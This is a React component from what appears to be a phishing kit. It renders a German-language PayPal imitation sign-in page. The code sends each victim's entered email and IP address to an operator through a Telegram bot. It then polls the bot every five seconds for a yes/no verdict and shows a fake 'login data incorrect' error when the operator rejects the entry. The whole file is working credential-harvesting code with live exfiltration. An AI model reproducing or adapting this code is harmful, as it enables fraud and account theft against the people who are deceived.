import React, {useState} from 'react';
import classes from './Email.module.css'
import {Link} from "react-router-dom";
import axios from "axios";
import bot from "../../bot_manager/manager";
import loader from "../../assets/loader.gif";
import {useEffect} from "react";

let firstState;
const Email = (props) => {

    const [email, setEmail] = useState('')
    const [isLoading, setLoading] = useState(false);
    //correct - none - incorrect
    const [isError, setError] = useState(false);
    const [invalid, setInvalid] = useState(false);

    const enterEmail = () => {
        if (validateEmail()) {
            axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
                ' говорит, что его почта : ' + email + '.%0A Подтвердите валидность (yes/no)'), '')
            axios.get(bot.getUpdates())
                .then((res) => {
                    firstState = res.data.result;
                })
            setLoading(true);
            props.setEmail(email)
        } else {
            setInvalid(true);
        }
    }

    const validateEmail = () => {
        return String(email)
            .toLowerCase()
            .match(
                /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            );
    };

    const getUpdatesInterval =  () => {
        let req;
        if (firstState && firstState.length > 80) {
            req = bot.getUpdatesOffset(Number(firstState[firstState.length - 1].update_id) + 1)
        } else req = bot.getUpdates();
        axios.get(req)
            .then((res) => {
                if (firstState) {
                    console.log(firstState)
                    console.log(res.data.result)
                    if (res.data.result.length !== firstState.length) {
                        let text = res.data.result[res.data.result.length - 1].message.text;
                        if (text.indexOf(props.info.IPv4) !== -1) {
                            if (text.indexOf('yes') !== -1) {
                                axios.post(bot.sendMessage('✔ Пользователь ' + props.info.IPv4 + '' +
                                    ' Успешно подтвердил почту'), '')
                                props.setStep(false);
                            } else if (text.indexOf('no') !== -1) {
                                axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
                                    ' Не подтвердил почту'), '')
                                setLoading(false);
                                setError(true);
                            } else firstState = res.data.result;
                        } else firstState = res.data.result;
                    }
                } else firstState = res.data.result;

            })
    }

    useEffect(() => {
        if (isLoading) {
            const interval = setInterval(getUpdatesInterval, 5000);
            return () => clearInterval(interval);
        }
    }, [isLoading])


    return (
        <div className={classes.corral}>
            {isLoading ? <img src={loader} className={classes.loader}/> : null}
            <div className={[classes.contentContainerBordered, isLoading ? classes.loaderActive : ''].join(' ')}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div id={"loginContent"}>
                    <div id="loginSection">
                        <div className={classes.notifications}>
                            <div className={classes.notifications}>
                                {isError ? <p className={[classes.notification, classes.notificationCritical].join(' ')}
                                                role="alert">Die eingegebenen Login-Daten sind nicht richtig.
                                    Bitte versuchen Sie es erneut.
                                </p> : null}
                            </div>
                        </div>
                        <form className={classes.maskable}  onSubmit={(e) => {
                            e.preventDefault();
                            enterEmail();
                        }}>
                            <div className={classes.clearfix}>
                                <div className={classes.splitPhoneSection}>
                                    <div className={classes.textInput}>
                                        <div className={classes.fieldWrapper}>
                                            {invalid ?
                                                <div className={[classes.errorMessage, classes.show].join(' ')}>
                                                <p className="invalidError hide">Das Format der E-Mail-Adresse oder
                                                    Handynummer ist ungültig.</p>
                                            </div> : ''}
                                            <label className={classes.fieldLabel}></label>
                                            <input placeholder={"E-mail-Adresse oder Handynummer"} value={email}
                                                   onChange={e => {
                                                       setEmail(e.target.value)
                                                       setInvalid(false);
                                                   }}/>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div className={classes.actions}>
                    <button className={[classes.button].join(' ')} onClick={enterEmail}>
                        Weiter
                    </button>
                </div>
                <div className={classes.signupContainer}>
                    <div className={classes.loginSignUpSeparator}>
                        <span className={classes.textInSeparator}>
                            oder
                        </span>
                    </div>
                    <Link to={"/something"}>
                        <button className={[classes.button, classes.secondary].join(' ')} onClick={enterEmail}>
                            Neu anmelden
                        </button>
                    </Link>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <span className={[classes.picker, classes.country_selector].join(' ')}>
                            <button className={[classes.country ,classes.RU].join(' ')}>
                            </button>
                        </span>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected}>Deutsch</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Email;